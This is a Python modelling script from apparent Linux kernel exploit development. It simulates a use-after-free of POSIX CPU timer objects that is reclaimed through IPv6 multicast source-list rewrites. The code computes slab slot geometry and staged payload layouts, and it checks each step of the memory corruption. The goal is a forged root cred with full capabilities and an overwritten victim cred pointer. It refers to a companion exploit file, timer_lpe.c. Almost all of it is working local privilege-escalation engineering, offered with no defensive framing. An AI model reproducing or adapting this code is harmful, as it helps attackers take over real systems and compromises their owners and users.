# mcastrel4.py -- Design D2: mcast (psl) port of the peak chain; the parked
# collect is released by our own psl rewrite, not by a third victim.
#
# Node slot geometry: the freed k_itimer slab is order-1 (0x2000), 31 objects
# of stride 0x108, node at object+0x78.  X = S + 0x108*k + 0x78, so the node's
# low byte is L = (0x78 + 8k) & 0xff and the attack needs the node slice to fit
# inside the psl's 14x16-byte source window [0x18, 0xf8):
#     0x18 <= L - 0x58   and   L + 0x50 <= 0xf8
# -> L in CLEAN_L.  L = 0xd0 is dropped (the release/elist block clobbers the
# next psl's sl_max/sl_count and `handling` becomes unreadable).
#
# Stages (all offsets from X):
#   s1: q0=scratch q1=0 q2=X+0x18 q3=1 q4=fake_head q5=1, sigev=1, it_lock=1
#   s2: q0=C q1=0 q2=winner+0x838 q3=0 q4=winner+0x7c8 q5=~0, sigev=1, it_lock=0
#
# The model checks, for every (L, O): window fit of every field, aux placement,
# slot distinctness at every stage, the parked lock word never reading 0, the
# delete phase never shifting into the lock slot, the exact stage-1 and stage-2
# erase/commit byte writes, and the final image.
import sys

sys.path.insert(0, r'D:\kwork\icbuild\scratch')
import lay12 as L12

WLO, WHI = 0x18, 0xf8
NC = 14
# The lock slot is r0 = L - 0x58.  For L >= 0x78 r0 lands below the node
# fields (chunks 0..3), so the parked winner's list links stay in the
# stale-at-release tail.  For L in 0x18..0x48 r0 lands *above* the node
# fields (chunks 10..13) and the elist chunks are rewritten before the
# release, so the exploit must restore the two elist qwords from the T1
# read-back (see attempt1): the released winner runs list_del_init() on
# them, and a self-pointer would turn its list_for_each_entry_safe() into
# an infinite loop.  L in {0x00,0x08,0x10} puts q0 in the psl header/rcu
# zero area (unwritable), L in {0x50,0x58,0x60,0x68} puts it_lock there,
# L >= 0xb0 puts firing/handling past the window, and L = 0x70 is not an
# attainable slot (k = 31).
CLEAN_L = (0x18, 0x20, 0x28, 0x30, 0x38, 0x40, 0x48,
	   0x78, 0x80, 0x88, 0x90, 0x98, 0xa0, 0xa8)
TSEC_LEN = 0x18
KIT = 0x108
NODE = 0x78


class Fail(Exception):
    pass


def chk(c, m):
    if not c:
        raise Fail(m)


def chunk_of(r):
    return ((r & 0xff) - WLO) // 16


def slot_of(r):
    i = (r & 0xff) - WLO
    return i // 16, i % 16


class Block:
    def __init__(self, mem=None):
        self.mem = dict(mem or {})
        self.written = set()

    def copy(self):
        return Block(self.mem)

    def put(self, r, v, n=1, tag='', force=False):
        for i in range(n):
            rr = (r + i) & 0xff
            chk(WLO <= rr < WHI, '%s: residue %#x outside window' % (tag, rr))
            b = (v >> (8 * i)) & 0xff
            if not force and rr in self.mem and self.mem[rr] != b:
                raise Fail('%s: conflict at %#x (%#x vs %#x)'
                           % (tag, rr, self.mem[rr], b))
            self.mem[rr] = b
            self.written.add(rr)

    def putq(self, r, v, tag='', force=False):
        self.put(r, v, 8, tag, force)

    def getq(self, r):
        return sum(self.mem.get((r + i) & 0xff, 0) << (8 * i) for i in range(8))

    def get(self, r):
        return self.mem.get((r & 0xff), 0)

    def chunks(self):
        return [bytes(self.mem.get(WLO + 16 * k + i, 0) for i in range(16))
                for k in range(NC)]


def fill(b, tag):
    """Free residues get chunk-unique non-zero filler; assert slot uniqueness
    (the rewrite deletes by value and must never hit an ambiguous value)."""
    out = b.copy()
    for k in range(NC):
        for _ in range(16):
            cur = out.chunks()
            if cur[k] != bytes(16) and cur.count(cur[k]) == 1:
                break
            for i in range(16):
                r = WLO + 16 * k + i
                if r not in out.mem:
                    out.mem[r] = 0x41 + ((k * 7 + i) % 0x3b)
                    break
            else:
                raise Fail('%s: slot %d not made unique' % (tag, k))
    ch = out.chunks()
    chk(len(set(ch)) == NC, '%s: slots not distinct' % tag)
    chk(bytes(16) not in ch, '%s: all-zero slot' % tag)
    return out


# ---------------------------------------------------------------- layout

def field_set(L, rt, stage):
    """(residue, value, size, tag) of the node slice for a stage."""
    X = rt['X']
    out = []
    def q(off, v, size, tag):
        out.append(((L + off) & 0xff, v, size, tag))
    q(0x00, rt['scratch'] if stage == 's1' else rt['C'], 8, 'q0')
    q(0x08, 0, 8, 'q1')
    q(0x10, X + 0x18 if stage == 's1' else rt['wcred'], 8, 'q2')
    q(0x18, 1 if stage == 's1' else 0, 8, 'q3')
    q(0x20, rt['fake_head'] if stage == 's1' else rt['whead'], 8, 'q4')
    q(0x28, 1 if stage == 's1' else (1 << 64) - 1, 8, 'q5')
    q(0x30, X + 0x30, 8, 'elist.next')
    q(0x38, X + 0x30, 8, 'elist.prev')
    q(0x40, 1, 4, 'firing')
    q(0x48, 0, 8, 'handling')
    q(-0x24, 1, 4, 'sigev')
    q(-0x58, 1 if stage == 's1' else 0, 4, 'it_lock')
    return out


def occupied(L, rt):
    s = set()
    for (r, v, n, tag) in field_set(L, rt, 's1') + field_set(L, rt, 's2'):
        for i in range(n):
            s.add((r + i) & 0xff)
    return s


def placements(L, rt):
    """Candidate (scratch, tsec) residue pairs.

    tsec: 0x18 contiguous in-window bytes avoiding every node field.  The real
    task_security_struct ends in 16 zero bytes (exec_sid/create_sid/... = 0),
    so a tsec starting on a 16-byte boundary would put an all-zero 16-byte
    source slot in the psl -- exactly the "absent value" the delete-by-value
    rewrite cannot use.  16-aligned starts are therefore tried last.

    scratch: s whose *write* region [s+0x10, s+0x20) avoids every field (the
    read region [s, s+0x10) may overlap tsec/filler: only +0x08/+0x10 are read
    and only as "must not equal X")."""
    occ = occupied(L, rt)
    free = [r for r in range(WLO, WHI) if r not in occ]
    tsecs = [r for r in range(WLO, WHI - TSEC_LEN + 1, 8)
             if all((r + i) in free for i in range(TSEC_LEN))]
    tsecs.sort(key=lambda r: (r % 16 == 0, r))
    for tsec in tsecs:
        occ2 = occ | set(range(tsec, tsec + TSEC_LEN))
        for s in range(WLO, WHI - 0x20 + 1, 8):
            if all((r) not in occ2 for r in range(s + 0x08, s + 0x20)):
                yield s, tsec


def build(L, rt, stage, tsec_bytes):
    b = Block()
    for (r, v, n, tag) in field_set(L, rt, stage):
        b.put(r, v, n, 'O.%s.%s' % (stage, tag))
    for i in range(TSEC_LEN):
        b.put(rt['sec_res'] + i, tsec_bytes[i], 1, 'O.tsec')
    return fill(b, 'O.%s' % stage)


def stage1_kernel(b, L, rt):
    """The collect's writes, in order, on top of the s1 pattern."""
    b.put(L + 0x40, 1, 4, 'k1.firing', force=True)      # collect_timerqueue
    b.putq(L + 0x48, rt['winner'], 'k1.handling', force=True)
    rb_erase_case1b(b, L, rt, 's1', rt['fake_head'])
    b.putq(L + 0x30, rt['elist_head'], 'k1.elist', force=True)
    b.putq(L + 0x38, rt['elist_head'], 'k1.elist', force=True)
    return b


def build_s1(L, rt, tsec_bytes):
    """Returns (P_s1, T1): our 14 sources and the post-collect image.  Both
    must have pairwise-distinct, non-zero source slots -- the rewrite deletes
    by value, and the delete phase runs on T1."""
    pre = Block()
    for (r, v, n, tag) in field_set(L, rt, 's1'):
        pre.put(r, v, n, 's1.%s' % tag)
    for i in range(TSEC_LEN):
        pre.put(rt['sec_res'] + i, tsec_bytes[i], 1, 's1.tsec')

    def t1():
        return stage1_kernel(pre.copy(), L, rt)

    post = t1()
    # filler residues must be untouched by the collect in both images
    free = [r for r in range(WLO, WHI)
            if r not in pre.mem and r not in post.written]
    for _ in range(4 * NC):
        bad = []
        for k in range(NC):
            a, b = pre.chunks()[k], post.chunks()[k]
            for i in range(NC):
                if i != k and (pre.chunks()[i] == a or post.chunks()[i] == b):
                    bad.append(k)
                    break
            if a == bytes(16) or b == bytes(16):
                bad.append(k)
        if not bad:
            break
        k = bad[0]
        cand = [r for r in free if chunk_of(r) == k]
        if not cand:
            raise Fail('s1: slot %d cannot be made unique' % k)
        pre.mem[cand[0]] = 0x41 + ((k * 7 + len(cand)) % 0x3b)
        pre.written.add(cand[0])
        post = t1()
    else:
        raise Fail('s1: fill did not converge')
    chk(len(set(pre.chunks())) == NC and bytes(16) not in pre.chunks(),
        'P_s1 slots not distinct')
    chk(len(set(post.chunks())) == NC and bytes(16) not in post.chunks(),
        'T1 slots not distinct')
    return pre, post


# ---------------------------------------------------------------- kernel

def rb_erase_case1b(b, L, rt, stage, head):
    """timerqueue_del(head, &X->node): cached-leftmost fixup + case 1b +
    RB_CLEAR_NODE + ctmr->head = NULL.  The cred block's bytes at C+0x08/0x10
    come from rt (that block is never rewritten by this model)."""
    q = lambda off: (L + off) & 0xff
    pc = b.getq(q(0x00))
    right = b.getq(q(0x08))
    left = b.getq(q(0x10))
    X = rt['X']
    chk(pc != X, '%s: RB_EMPTY_NODE would WARN' % stage)
    chk(right == 0, '%s: case 1b needs rb_right == NULL' % stage)
    chk(left != 0, '%s: case 1b needs rb_left != NULL' % stage)
    parent = pc & ~3
    chk(parent != 0, '%s: parent 0 (root rewrite path)' % stage)
    if head == rt['whead']:
        # rb_erase_cached: leftmost == X -> leftmost = rb_next(X)
        chk(rt['C08'] != X, '%s: rb_next(X) would loop' % stage)
        chk(parent == rt['C'], '%s: rb_next(X) != C' % stage)
    # tmp->__rb_parent_color = pc = node->__rb_parent_color
    b.putq(q(0x18), pc, '%s.q3=pc' % stage, force=True)
    # __rb_change_child(node, tmp=left, parent, root)
    pres = parent & 0xff
    chk(WLO <= pres < WHI, '%s: parent outside the window' % stage)
    if parent == rt['C']:
        pleft = rt['C10']
    else:
        pleft = b.getq((pres + 0x10) & 0xff)
    dst = ((pres + 0x10) if pleft == X else (pres + 0x08)) & 0xff
    if parent == rt['C']:
        # the parent lives in the cred's block, not in block O: the write
        # lands at C+0x08 (rb_right), i.e. cred gid|suid, and must not be
        # applied to block O's bytes.
        chk(stage == 's2', 'fake-head parent must not be C')
        chk(dst == ((rt['C'] & 0xff) + 0x08), 'stage 2 must clobber cred+8')
        chk(rt['C10'] != X, 'stage 2 must take the rb_right branch')
        chk(rt['C08'] != X, 'rb_next(X) would loop at C')
    else:
        b.putq(dst, left, '%s.change_child' % stage, force=True)
    # RB_CLEAR_NODE, then ctmr->head = NULL
    b.putq(q(0x00), X, '%s.clear' % stage, force=True)
    b.putq(q(0x20), 0, '%s.head=0' % stage, force=True)


def commit_run(b, L, rt):
    """The firing loop with it_lock held and released."""
    q = lambda off: (L + off) & 0xff
    chk(b.getq(q(0x40)) & 0xffffffff == 1, 'commit: firing not set')
    chk(b.getq(q(-0x24)) & 0xffffffff == 1, 'commit: sigev != SIGEV_NONE')
    chk(b.getq(q(-0x58)) & 0xffffffff == 0, 'commit: not locked')
    b.putq(q(0x30), rt['X'] + 0x30, 'commit.elist.next', force=True)
    b.putq(q(0x38), rt['X'] + 0x30, 'commit.elist.prev', force=True)
    b.put(q(0x40), 0, 4, 'commit.firing=0', force=True)
    b.putq(q(0x18), 0, 'commit.expires=0', force=True)   # cpu_timer_fire
    b.putq(q(0x48), 0, 'commit.handling=NULL', force=True)
    b.put(q(-0x58), 0, 4, 'commit.unlock', force=True)


# ---------------------------------------------------------------- ip6_mc_source

class Sim:
    def __init__(self, chunks):
        self.a = [bytes(c) for c in chunks]
        self.count = NC

    def word(self, r0):
        v = 0
        for i in range(4):
            k, j = slot_of(r0 + i)
            v |= self.a[k][j] << (8 * i)
        return v

    def delete_val(self, v):
        v = bytes(v)
        for j in range(self.count):
            if self.a[j] == v:
                for k in range(j + 1, self.count):
                    self.a[k - 1] = self.a[k]
                self.count -= 1
                return j
        raise Fail('delete: value absent (count %d)' % self.count)

    def add(self, v):
        v = bytes(v)
        chk(self.count < NC, 'add would kfree_rcu the psl')
        for k in range(self.count):
            chk(self.a[k] != v, 'add: duplicate -> EADDRNOTAVAIL')
        self.a[self.count] = v
        self.count += 1


def rewrite_park_release(sim, dst, c_lock, r0, tag):
    """Delete the tail down to the lock slot, delete the front down to 0, then
    add slots 0..c_lock; the add of slot c_lock writes the release."""
    while sim.count > c_lock:
        j = sim.delete_val(sim.a[sim.count - 1])
        chk(j == sim.count, '%s: tail delete matched slot %d' % (tag, j))
        chk(sim.word(r0) == 1, '%s: lock word %#x is not parked'
            % (tag, sim.word(r0)))
    while sim.count > 0:
        j = sim.delete_val(sim.a[0])
        chk(j == 0, '%s: front delete matched slot %d' % (tag, j))
        chk(sim.word(r0) == 1, '%s: lock word %#x is not parked'
            % (tag, sim.word(r0)))
    for k in range(c_lock + 1):
        sim.add(dst[k])
        if k < c_lock:
            chk(sim.word(r0) == 1, '%s: released by slot %d' % (tag, k))
    chk(sim.word(r0) == 0, '%s: lock word %#x after the release chunk'
        % (tag, sim.word(r0)))


def rewrite_finish(sim, dst, c_lock, tag):
    for k in range(c_lock + 1, NC):
        sim.add(dst[k])
    chk(sim.count == NC, '%s: final count %d' % (tag, sim.count))
    chk([bytes(x) for x in sim.a] == [bytes(x) for x in dst],
        '%s: final slots differ' % tag)


# ---------------------------------------------------------------- attempt

def attempt(base, oi, L, rt, tsec_bytes):
    X = base + 0x100 * oi + L
    slab = X & ~0x1fff
    off = X - NODE - slab
    chk(off % KIT == 0, 'X is not a node slot')
    chk(0 <= off // KIT < 31, 'k out of range')
    chk((X - slab) >> 8 == oi, 'O does not match X')
    chk(X & 0xff == L, 'L mismatch')
    chk(L in CLEAN_L, 'L not clean')
    chk((rt['C'] - base) >> 8 != oi, 'cred in block O')
    chk((rt['C'] & 0xff) == 0x18, 'cred phase != 0x18')
    rt = dict(rt, X=X)
    rt['fake_head'] = rt['C'] - 0x10
    err = None
    tried = 0
    for scratch, sec in placements(L, dict(rt, scratch=0)):
        tried += 1
        r2 = dict(rt, sec_res=sec, scratch_res=scratch,
                  scratch=base + 0x100 * oi + scratch)
        try:
            return attempt1(base, oi, L, r2, tsec_bytes, scratch, sec)
        except Fail as e:
            err = e
    raise Fail('no placement works (%d tried, last: %s)' % (tried, err))


def attempt1(base, oi, L, rt, tsec_bytes, scratch, sec):
    X = rt['X']
    slab = X & ~0x1fff

    # ---- leak step (B's reap on the all-zero node) -------------------------
    lb = Block()                     # post-spray node bytes are zeros
    chk(lb.getq(L) == 0 and lb.getq(L + 0x20) == 0, 'leak pre-state')
    lb.putq(L + 0x00, X, 'leak.clear')      # RB_CLEAR_NODE
    lb.putq(L + 0x20, 0, 'leak.head=0')     # ctmr->head = NULL
    v = lb.getq(L)
    chk(v == X, 'leak stores X at X')
    chk(((v - NODE - slab) % KIT) == 0, 'leak signature 1')
    chk(0 <= (v - NODE - slab) // KIT < 31, 'leak signature 2')
    chk((v & 0xff) == L, 'leak signature 3')
    # a bad L is a *safe* abort: the psl is still all zeros, so any later
    # cleanup_timerqueue() takes case 1a with pc = 0, parent = 0,
    # child = rb_right = 0, rb_next(X) = NULL -> the loop ends with no write
    # outside the block.
    zb = Block()
    chk(zb.getq(0x00) == 0 and zb.getq(0x08) == 0, 'zero node')

    # ---- stage 1 -----------------------------------------------------------
    r0 = (L - 0x58) & 0xff
    c_lock = chunk_of(r0)
    pre, b1 = build_s1(L, rt, tsec_bytes)
    chk(pre.getq(r0) & 0xffffffff == 1, 's1 lock word')
    chk(b1.getq(r0) & 0xffffffff == 1, 'T1 lock word')
    # scratch contract: the erase writes scratch at scratch+0x18 and at
    # scratch+0x10 or +0x08; rb_next (only if the fake head's stale leftmost
    # happens to equal X) reads scratch+0x08, which must not equal X.
    chk(pre.getq(scratch + 0x08) != X, 'scratch+8 == X')
    chk(pre.getq(scratch + 0x10) != X, 'scratch+0x10 == X')
    tsec_r = set(range(sec, sec + TSEC_LEN))
    for (r, v, n, tag) in field_set(L, rt, 's1') + field_set(L, rt, 's2'):
        for i in range(n):
            chk(((r + i) & 0xff) not in tsec_r, 'write %s hits the tsec' % tag)
    chk(b1.getq(L + 0x18) == rt['scratch'], 'iteration 2 must read scratch')
    chk(rt['scratch'] > 0xffff000000000000, 'scratch must be huge')
    # commit parks on it_lock == 1: nothing after the lock may have run
    chk(b1.getq(L + 0x48) == rt['winner'], 'handling not set')
    chk(b1.getq(L + 0x30) == rt['elist_head'], 'elist moved while parked')
    chk(b1.getq(L + 0x00) == X, 'T1 q0 must be X (RB_CLEAR_NODE)')

    # ---- stage 2 pattern ---------------------------------------------------
    b2 = build(L, rt, 's2', tsec_bytes)
    chk(b2.getq(r0) & 0xffffffff == 0, 's2 lock must be 0')
    chk(b2.getq(L + 0x00) == rt['C'], 's2 q0')
    chk(b2.getq(L + 0x18) == 0, 's2 q3 must be due')
    # The exploit restores the two elist qwords from the T1 read-back before
    # the rewrite (timer_lpe.c: ic_mc_replace_parked).  The released winner
    # runs list_del_init(&ctmr->elist) in handle_posix_cpu_timers(), so when
    # the elist chunks sit at or below the lock chunk (low L) the value the
    # release append writes must be the stage-1 list head, not the s2
    # self-pointer: a self-pointer makes the winner's
    # list_for_each_entry_safe() iterate forever.  The two other fields the
    # winner reads after the release are identical in T1 and s2.
    dst = b2.copy()
    for off in (0x30, 0x38):
        dst.putq((L + off) & 0xff, b1.getq(L + off), 'dst.keep_elist',
                 force=True)
    chk(dst.getq(L + 0x30) == b1.getq(L + 0x30), 'dst elist.next != T1')
    chk(dst.getq(L + 0x38) == b1.getq(L + 0x38), 'dst elist.prev != T1')
    chk(dst.getq(L + 0x40) & 0xffffffff == 1, 'dst firing != 1')
    chk(dst.getq(L - 0x24) & 0xffffffff == 1, 'dst sigev != SIGEV_NONE')

    # ---- parked rewrite ----------------------------------------------------
    src_chunks = b1.chunks()
    dst_chunks = dst.chunks()
    chk(len(set(dst_chunks)) == NC and bytes(16) not in dst_chunks,
        'dst slots not distinct')
    sim = Sim(src_chunks)
    rewrite_park_release(sim, dst_chunks, c_lock, r0, 'L=%#x/O=%d' % (L, oi))
    # the winner's view at release: sim.a is the physical memory (slots past
    # sl_count keep the bytes the shift-delete left there), so the whole block
    # is sim.a -- slots > c_lock still hold the post-stage-1 leftovers
    live = Block()
    for kk in range(NC):
        for i in range(16):
            live.mem[WLO + 16 * kk + i] = sim.a[kk][i]
    # Only these three reads happen between the release and the finish.
    chk(live.getq(L + 0x30) == b1.getq(L + 0x30), 'winner lost elist.next')
    chk(live.getq(L + 0x38) == b1.getq(L + 0x38), 'winner lost elist.prev')
    chk(live.getq(L + 0x40) & 0xffffffff == 1, 'winner lost firing')
    chk(live.getq(L - 0x24) & 0xffffffff == 1, 'winner lost sigev')
    commit_run(live, L, rt)
    rewrite_finish(sim, dst_chunks, c_lock, 'L=%#x/O=%d' % (L, oi))

    # ---- stage 2 collect ---------------------------------------------------
    b = dst.copy()
    b.put(L + 0x40, 1, 4, 'k2.firing', force=True)
    b.putq(L + 0x48, rt['winner'], 'k2.handling', force=True)
    rb_erase_case1b(b, L, rt, 's2', rt['whead'])
    b.putq(L + 0x30, rt['elist_head'], 'k2.elist', force=True)
    b.putq(L + 0x38, rt['elist_head'], 'k2.elist', force=True)
    # iteration 2: getnext == C, expires = *(C+0x18) (huge) -> return
    chk(rt['C18'] > 0xffff000000000000, 'cred+0x18 must be huge')
    chk(b.getq(L + 0x00) == X, 'stage 2 clears the node')
    chk(b.getq(L + 0x10) == rt['wcred'], 'stage 2 writes through q2')
    commit_run(b, L, rt)
    chk(b.getq(r0) & 0xffffffff == 0, 'final unlock')
    return True


def cred_info(st):
    C = st.addr['cred']
    m = st.mem
    q = lambda off: sum(m.get((C + off + i) & 0xff, 0) << (8 * i)
                        for i in range(8))
    return C, {
        'self': q(0x00) == C,
        'euid': q(0x14) & 0xffffffff,
        'egid_fsuid': q(0x18),
        'caps': (q(0x30), q(0x38)),
        'security': q(0x78),
        'user_ns': q(0x88),
        'ucounts': q(0x90),
        'gi': q(0x98),
        'keyring': q(0x68),
    }


def main():
    base = int(sys.argv[1], 0) if len(sys.argv) > 1 else 0xffffff80036d2000
    tsec_bytes = b''.join(v.to_bytes(4, 'little') for v in (0x0a, 0x0a, 0, 0, 0, 0))
    # X = S + 0x108*k + 0x78 fixes both L and O: the attack is possible only
    # for the k whose L lands in CLEAN_L (7 of 31 slots, ~22.6%).
    print('  k    X-S     O    L   usable')
    pairs = []
    for k in range(31):
        d = KIT * k + NODE
        L = d & 0xff
        O = d >> 8
        ok = L in CLEAN_L
        print('%3d  %#06x  %2d  %#04x  %s' % (k, d, O, L, 'yes' if ok else '-'))
        if ok:
            pairs.append((O, L))
    bad = tot = 0
    for (oi, L) in pairs:
        tot += 1
        try:
            # the tsec/scratch residues depend only on L (not on the layout),
            # so they can be chosen before solving; lay12 then puts
            # cred->security at exactly that address.
            X = base + 0x100 * oi + L
            dummy = dict(C=base + 0x18, scratch=0, X=X,
                         wcred=base + 0x838, whead=base + 0x7c8,
                         fake_head=base + 0x08)
            scratch, sec = next(placements(L, dict(dummy, scratch=0)))
            chk(scratch is not None and sec is not None, 'no aux room')
            st, info = L12.solve(base, oi, sec)
            chk(st is not None, 'lay12: no layout')
            C, ci = cred_info(st)
            chk(ci['self'], 'cred usage|uid != self')
            chk(ci['euid'] == 0, 'cred euid != 0')
            chk(ci['egid_fsuid'] > 0xffff000000000000, 'cred+0x18 not huge')
            chk(ci['caps'][0] == 0xffffffffffffffff, 'caps permitted')
            chk(ci['caps'][1] == 0xffffffffffffffff, 'caps effective')
            chk(ci['keyring'] == 0, 'thread_keyring')
            chk(ci['security'] == base + 0x100 * oi + sec,
                'cred->security != the tsec address')
            rt = dict(C=C, winner=0xffffff8001234000,
                      wcred=0xffffff8001234000 + 0x838,
                      whead=0xffffff8001234000 + 0x7c8,
                      elist_head=0xffffff8001234560,
                      C08=0, C10=0, C18=0xffffffff00000000)
            attempt(base, oi, L, rt, tsec_bytes)
            print('O=%d L=%#04x  OK  scratch=%#04x tsec=%#04x C=%#x'
                  % (oi, L, scratch, sec, C))
        except Fail as e:
            bad += 1
            print('O=%d L=%#04x  FAIL %s' % (oi, L, e))
    print('total %d/%d' % (tot - bad, tot))
    return 0 if bad == 0 else 1


if __name__ == '__main__':
    raise SystemExit(main())
